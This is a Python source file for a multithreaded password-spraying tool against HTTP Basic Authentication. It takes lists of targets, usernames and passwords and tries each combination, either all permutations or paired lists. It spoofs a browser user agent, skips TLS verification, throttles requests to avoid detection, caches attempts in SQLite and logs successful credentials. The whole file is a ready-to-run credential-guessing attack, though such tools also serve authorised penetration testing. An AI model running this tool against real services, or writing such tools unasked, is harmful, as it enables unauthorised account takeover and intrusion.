import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.listUtils as lu
import ZHOR_Modules.osUtils as osu
import ZHOR_Modules.logUtils as logu
from ZHOR_Modules.csvUtils import getTimeStamp

import sqlite3
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from datetime import timedelta
import argparse
import sys
import threading
import time





parser = argparse.ArgumentParser(description="Basic Auth Spray")
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Required arguments
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET LIST"',type=str,required=True,help='Target IP or fqdn list file')
REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USERS"',type=str,required=True,help='Users list file')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORDS"',type=str,required=True,help='Passwords list file')
REQUIRED_ARGUMENTS.add_argument('-s',metavar='"SLEEP"',type=int,required=True,help='Sleep time between each request (in milliseconds)')
REQUIRED_ARGUMENTS.add_argument('-T',metavar='"THREADS"',type=int,required=True,help='Threads (corresponding to concurrent requests)')
REQUIRED_ARGUMENTS.add_argument('-m',metavar='"MODE"',type=int,required=True,help='Triplet Mode (read documentation for details)')

# Optional arguments
OPTIONAL_ARGUMENTS.add_argument('-q',action="store_true",help='"Quiet" mode: Skip the initial recap and the "press enter to continue" message')
OPTIONAL_ARGUMENTS.add_argument('-d',metavar="DB",type=str,required=False,help='Cache database path (if different from default)')
OPTIONAL_ARGUMENTS.add_argument('--timeout',type=int,required=False,help='Connection attempt timeout (in milliseconds). By default is 1000ms')
OPTIONAL_ARGUMENTS.add_argument('--no-cache',action="store_true",help="Ignore cached results")
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ========================================================================================================

HEADERS = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"}
#PROXYES = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
PROXYES = None

LOG_LOCK    = threading.Lock()
STDOUT_LOCK = threading.Lock()
DB_LOCK     = threading.Lock()
LOG_PATH = f"basic_auth_bf_log_{getTimeStamp()}.log"
CACHE_DB = "basic-auth-spray-cache.db"
SKIP_CACHE = False
CONNECTION_TIMEOUT = None


def dbCheck():
    DB_LOCK.acquire()
    
    # Connect to the SQLite database (it will create the database if it does not exist)
    conn = sqlite3.connect(CACHE_DB)
    cursor = conn.cursor()

    # Create the table if it does not exist
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS cached_results (
        target TEXT,
        user TEXT,
        password TEXT,
        result TEXT
    )
    ''')

    # Commit the transaction and close the connection
    conn.commit()
    conn.close()

    DB_LOCK.release()

def writeCache(target, user, password, result):
    global DB_LOCK

    DB_LOCK.acquire()
    
    # Connect to the SQLite database (it will create the database if it does not exist)
    conn = sqlite3.connect(CACHE_DB)
    cursor = conn.cursor()

    # Insert the values into the table
    cursor.execute('''
    INSERT INTO cached_results (target, user, password, result)
    VALUES (?, ?, ?, ?)
    ''', (target, user, password, result))

    # Commit the transaction and close the connection
    conn.commit()
    conn.close()

    DB_LOCK.release()

def readCache(target, user, password):
    # Connect to the SQLite database
    conn = sqlite3.connect(CACHE_DB)
    cursor = conn.cursor()

    # Query the table for the specified values
    cursor.execute('''
    SELECT * FROM cached_results
    WHERE target = ? AND user = ? AND password = ?
    ''', (target, user, password))

    # Fetch the result
    result = cursor.fetchall()
    #print(result)
    #input()

    # If result is None, it means the values do not exist in the database
    conn.close()
    
    if len(result) == 0:
        return False
    
    return True

# return false ---> not a KO
# return a string ---> reason of KO
def isKo(responseObject):

    koKeywords = ['unauthorized'] # add more as they are found

    if (responseObject.status_code == 401):
        return "Reason: status 401"
    
    for word in koKeywords:
        if word in responseObject.text.lower():
            return f"Reason: keyword '{word}' in response text"
        

    # not actually a ko
    return False

def attemptConnection(target: str, username: str, password: str):
    result = None

    if not SKIP_CACHE:
        cacheResult = readCache(target,username,password)
        if cacheResult is True:

            msg = "[CACHED] Target {} | User: {} | Password: {}".format(target,username,password)
            logu.logDebug(msg,fileName=LOG_PATH,lock=LOG_LOCK)
            
            # let the thread wrapper know it was a cached request, do not sleep
            return 1 

    #    writeCache(target,username,password)

    try:
        auth = (username,password)
        result = requests.get(url="http://" + target,headers=HEADERS,proxies=PROXYES,verify=False,auth=auth,timeout=CONNECTION_TIMEOUT)
        

    except Exception as e:
        msg_stdout = "[EXCEPTION] Target {} | User: {} | Password: {} | check log for details".format(target,username,password)
        msg_log = "[EXCEPTION] Target {} | User: {} | Password: {} | {}".format(target,username,password,str(e))
        np.errorPrint(msg_stdout,lock=STDOUT_LOCK)        
        logu.logError(msg_log,fileName=LOG_PATH, lock=LOG_LOCK,stdout=False)
        writeCache(target,username,password,'EXCEPTION')   
        return


    

    ko = isKo(result)

    # auth succeded
    if ko is False:        
        msg = "[SUCCESS] Target {} | User: {} | Password: {}".format(target,username,password)
        logu.logInfo(msg,fileName=LOG_PATH,lock=LOG_LOCK)
        writeCache(target,username,password,'SUCCESS')
        return

    # auth failed
    msg = "[FAILED] Target {} | User: {} | Password: {} | {}".format(target,username,password,ko)
    logu.logDebug(msg,fileName=LOG_PATH,lock=LOG_LOCK)
    writeCache(target,username,password,'FAILED')
    return


# function used by the threads
def threadWrapperFunction(threadID: int,triplets: list,sleepTime: int):
    # triplet structure
    # [target,user,password]

    for triplet in triplets:
        msg = "[Thread #{}] Testing {} {} {}".format(str(threadID),triplet[0],triplet[1],triplet[2])
        np.debugPrint(msg,lock=STDOUT_LOCK)


        res = attemptConnection(triplet[0],triplet[1],triplet[2])

        if res == 1: # was it a cached request? (assuming SKIP_CACHE is false)
            pass
        else:
            time.sleep(sleepTime)


# builds the triplets
def makeTriplets(tripletMode: int,targets: list, users: list, passwords: list):
    
    #  all possible permutations
    if tripletMode == 1:
        return lu.listsElementsPermutations([targets,users,passwords])

    # for each target, couple the user and pw
    # NOTE: for this, it is required that the amount of users == amount of passwords
    if tripletMode == 2:
        
        if len(users) != len(passwords):
            np.errorPrint("The amount of users does not equal the amount of passwords (it is a mandatory requirement for triplet mode 2)")
            exit()

        _triplets = []

        for t in targets:
            for i in range(0,len(users)):
                _triplets.append([t,users[i],passwords[i]])

        return _triplets

def recap(tripletMode: int, targets: list, users: list, passwords: list,threadCount: int,sleepTime: int):
    
    totalRequests = None

    if tripletMode == 1:
        totalRequests = len(targets) * len(users) * len(passwords)

    if tripletMode == 2:
        totalRequests = len(targets) * len(users)
    
    np.infoPrint("Recap")
    print("Targets:",len(targets),sep="\r\t\t\t")
    print("Usernames:",len(users),sep="\r\t\t\t")
    print("Passwords:",len(passwords),sep="\r\t\t\t")
    print("Triplet mode:",tripletMode,sep="\r\t\t\t")
    print("Total requests:",totalRequests,sep="\r\t\t\t")
    print("Simultaneous requests:",threadCount,sep="\r\t\t\t")
    print("Sleep time (sec)",sleepTime,sep="\r\t\t\t")
    print("\n")

    etaSeconds = None
    if sleepTime == 0:
        etaSeconds = ((totalRequests) / threadCount) * 1
    else:
        etaSeconds = ((totalRequests / threadCount) * sleepTime)



    eta = timedelta(seconds=etaSeconds)
    print("ETA (best case):",eta)
    print("\n")

    osu.pressEnterToContinue()


if __name__ == '__main__':

    

    quiet       = '-q' in sys.argv
    SKIP_CACHE  = '--no-cache' in sys.argv
    
    tripletMode = args.m
    targets     = fm.fileToSimpleList(args.t)
    users       = fm.fileToSimpleList(args.u)
    passwords   = fm.fileToSimpleList(args.p)
    sleepTime   = 0 
    if args.s > 0: sleepTime = int(args.s) / 1000
    threadCount = args.T

    if '-d' in sys.argv:
        CACHE_DB = args.d


    if '--timeout' in sys.argv:
        if args.timeout == 0:
            CONNECTION_TIMEOUT = 0
        else:
            CONNECTION_TIMEOUT = int(args.timeout) / 1000


    dbCheck()

    # organizing triplets
    triplets = makeTriplets(tripletMode,targets,users,passwords)
    threadList = []
    sublists = lu.splitList(triplets, threadCount)
    
    for i in range(0,threadCount):
        argument = sublists[i]
        t = threading.Thread(target=threadWrapperFunction,args=(i+1,sublists[i],sleepTime))
        threadList.append(t)


    if not quiet:
        recap(tripletMode,targets,users,passwords,threadCount,sleepTime)


    logu.logInfo(lu.concatenate_elements(sys.argv,' '),fileName=LOG_PATH, lock=LOG_LOCK,stdout=False)

    # starting threads
    np.debugPrint("Starting threads")
    for thread in threadList:
        thread.start()


    # waiting for each thread to finish
    for thread in threadList:
        thread.join()


    np.infoPrint("Job done. Check log for results")